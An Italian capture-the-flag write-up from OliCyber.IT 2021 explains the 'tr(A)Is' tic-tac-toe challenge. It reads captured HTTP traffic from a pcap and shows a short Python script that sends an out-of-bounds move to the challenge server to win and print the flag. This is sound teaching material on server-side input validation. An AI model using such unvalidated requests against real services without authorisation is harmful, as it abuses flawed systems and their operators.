# OliCyber.IT 2021 - Competizione nazionale

## [network-1] tr(A)Is (111 risoluzioni)

Il sito indicato nella descrizione della challenge ([http://trais.challs.olicyber.it](http://trais.challs.olicyber.it)) implementa il gioco del tris. In allegato alla challenge, inoltre, si trova un file pcap che contiene del traffico catturato proprio mentre un utente visita quel sito e gioca a tris, oltre a visitare diverse pagine web.

### Soluzione

Analizzando il file pcap con Wireshark e seguendo i flussi TCP si possono vedere diversi tentativi di gioco finiti sempre in perdita o pareggio da parte dell'utente.

Il flusso n. 14, però, contiene una sequenza di mosse vincenti:

```
GET //api/move/2/2 HTTP/1.1
Host: 131.114.137.86:8080
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: session=.eJyrVkrKTyxKUbKKjs4rzcnRgROxOgQFYmsB0R4XUg.YJw2Tg.SnawVQ1Hh2p_sK5pZRn4OW8WO38

HTTP/1.1 200 OK
Content-Length: 34
Content-Type: application/json
Date: Wed, 12 May 2021 20:10:54 GMT
Server: waitress
Set-Cookie: session=.eJyrVkrKTyxKUbKKjs4rzcnRgROxOhABQxQemNA1jI2tBQBUwxRr.YJw2Tg.Rowcw92opF2k56_M6o02ClKsmwY; HttpOnly; Path=/
Vary: Cookie

{"move":[1,1],"status":"ongoing"}
GET //api/move/2/1 HTTP/1.1
Host: 131.114.137.86:8080
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: session=.eJyrVkrKTyxKUbKKjs4rzcnRgROxOhABQxQemNA1jI2tBQBUwxRr.YJw2Tg.Rowcw92opF2k56_M6o02ClKsmwY

HTTP/1.1 200 OK
Content-Length: 34
Content-Type: application/json
Date: Wed, 12 May 2021 20:10:54 GMT
Server: waitress
Set-Cookie: session=.eJyrVkrKTyxKUbKKjs4rzcnRgROxOhABQxjPUEcXhGJjawHnvBGE.YJw2Tw.7UtXpRsctOGMgVFvV9TXLK-0Mv8; HttpOnly; Path=/
Vary: Cookie

{"move":[2,0],"status":"ongoing"}
GET //api/move/2/3 HTTP/1.1
Host: 131.114.137.86:8080
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: session=.eJyrVkrKTyxKUbKKjs4rzcnRgROxOhABQxjPUEcXhGJjawHnvBGE.YJw2Tw.7UtXpRsctOGMgVFvV9TXLK-0Mv8

HTTP/1.1 200 OK
Content-Length: 67
Content-Type: application/json
Date: Wed, 12 May 2021 20:10:55 GMT
Server: waitress
Vary: Cookie

{"message":"Hai vinto! flag{redacted}","move":null,"status":"won"}
```

Come si può notare dalla sequenza di richieste e risposte catturate, l'utente esegue le seguenti tre mosse: `(2,2) (2,1) (2,3)` inserendo una X fuori dalla board e raggiungendo una configurazione di questo tipo:

```
. . .
. O .
O X X X
      ^
```

La prima X in `(2,2)` e la seconda in `(2,1)` si posso posizionare utilizzando l'interfaccia web. Come inserire la terza? Analizzando il sorgente della pagina web, si può notare la definizione della seguente funzione:

```js
function sendMove(i, j) {
  var cellX = document.getElementById(`cell_${i}${j}`);
  if (!isGameRunning || cellX?.innerText) return;

  fetch(`/api/move/${i}/${j}`)
    .then((res) => res.json())
    .then((data) => {
      console.log(`sendMove(${i}, ${j}) -> ${JSON.stringify(data)}`);

      if (data.status != "ongoing") {
        isGameRunning = false;
        message.innerText = data.message;
      }

      if (data.status == "won") {
        return;
      }

      if (data.move) {
        var cellO = document.getElementById(
          `cell_${data.move[0]}${data.move[1]}`
        );
        cellO.innerText = "⭕";
      }
    });

  cellX.innerText = "❌";
}
```

Sarà quindi sufficiente aprire la console JS dal browser ed eseguire `sendMove(2,3)` per posizionare l'ultima X ed ottenere la flag.

### Exploit

La funzione `sendMove` al suo interno non fa altro che eseguire una richiesta GET all'endpoit `/api/move/i/j` dove `i` e `j` sono le due componenti della mossa che si desidera eseguire. Possiamo quindi scriptare la sequenza di richieste per eseguire tutte e tre le mosse e stampare la flag.

```python
import requests

URL = 'http://trais.challs.olicyber.it/'

s = requests.Session()

s.get(URL)
s.get(f"{URL}/api/move/2/2")
s.get(f"{URL}/api/move/2/1")
text = s.get(f"{URL}/api/move/2/3").text
print(text[text.index('flag{'):text.index('}') + 1])

# flag{w4ai7...n0n_val3_e'_c0n7r0_l3_regol3}
```
